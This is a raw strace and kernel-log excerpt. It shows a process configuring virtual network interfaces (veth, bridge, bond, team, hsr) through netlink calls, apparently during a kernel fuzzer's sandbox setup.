[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x1c\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1b\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1b&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0_to_bridge&quot;, ifr_ifindex=28}) = 0
[pid  5086] close(4)                    = 0
[   76.921978][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth1: link becomes ready
[   76.933864][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth0: link becomes ready
[   76.956434][ T5086] 8021q: adding VLAN 0 to HW filter on device team0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x1c\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x1b\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1_to_bridge&quot;, ifr_ifindex=30}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x1e\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x1c\x08\x00\x01\x00\xac\x14\x14\x1c&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1_to_bridge&quot;, ifr_ifindex=30}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x1e\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1c\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1c&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1_to_bridge&quot;, ifr_ifindex=30}) = 0
[pid  5086] close(4)                    = 0
[   76.980426][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth0_to_bridge: link becomes ready
[   76.989968][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): bridge_slave_0: link becomes ready
[   77.000169][ T1120] bridge0: port 1(bridge_slave_0) entered blocking state
[   77.007359][ T1120] bridge0: port 1(bridge_slave_0) entered forwarding state
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x1e\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x1c\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0_to_bond&quot;, ifr_ifindex=32}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x20\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x1d\x08\x00\x01\x00\xac\x14\x14\x1d&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0_to_bond&quot;, ifr_ifindex=32}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x20\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1d\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1d&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0_to_bond&quot;, ifr_ifindex=32}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x20\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x1d\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[   77.030891][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth1_to_bridge: link becomes ready
[   77.040132][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): bridge_slave_1: link becomes ready
[   77.048997][ T1120] bridge0: port 2(bridge_slave_1) entered blocking state
[   77.056126][ T1120] bridge0: port 2(bridge_slave_1) entered forwarding state
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1_to_bond&quot;, ifr_ifindex=34}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x22\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x1e\x08\x00\x01\x00\xac\x14\x14\x1e&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1_to_bond&quot;, ifr_ifindex=34}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x22\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1e\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1e&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1_to_bond&quot;, ifr_ifindex=34}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x22\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x1e\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0_to_team&quot;, ifr_ifindex=36}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x24\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x1f\x08\x00\x01\x00\xac\x14\x14\x1f&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0_to_team&quot;, ifr_ifindex=36}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x24\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0_to_team&quot;, ifr_ifindex=36}) = 0
[pid  5086] close(4)                    = 0
[   77.081033][   T26] IPv6: ADDRCONF(NETDEV_CHANGE): veth0_to_bond: link becomes ready
[   77.107118][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth1_to_bond: link becomes ready
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x24\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x1f\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1_to_team&quot;, ifr_ifindex=38}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x26\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x20\x08\x00\x01\x00\xac\x14\x14\x20&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1_to_team&quot;, ifr_ifindex=38}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x26\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1_to_team&quot;, ifr_ifindex=38}) = 0
[pid  5086] close(4)                    = 0
[   77.136595][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth0_to_team: link becomes ready
[   77.147713][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): team_slave_0: link becomes ready
[   77.159435][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): team0: link becomes ready
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x26\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x20\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0_to_hsr&quot;, ifr_ifindex=45}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x2d\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x21\x08\x00\x01\x00\xac\x14\x14\x21&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0_to_hsr&quot;, ifr_ifindex=45}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x2d\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x21\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x21&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0_to_hsr&quot;, ifr_ifindex=45}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x2d\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x21\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1_to_hsr&quot;, ifr_ifindex=47}) = 0
[pid  5086] close(4)                    = 0
[   77.183860][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth1_to_team: link becomes ready
[   77.198246][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): team_slave_1: link becomes ready
[   77.222274][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth0_to_hsr: link becomes ready
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x2f\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x22\x08\x00\x01\x00\xac\x14\x14\x22&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1_to_hsr&quot;, ifr_ifindex=47}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x2f\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x22\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x22&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1_to_hsr&quot;, ifr_ifindex=47}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x2f\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x22\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;hsr0&quot;, ifr_ifindex=49}) = 0
[pid  5086] close(4)                    = 0
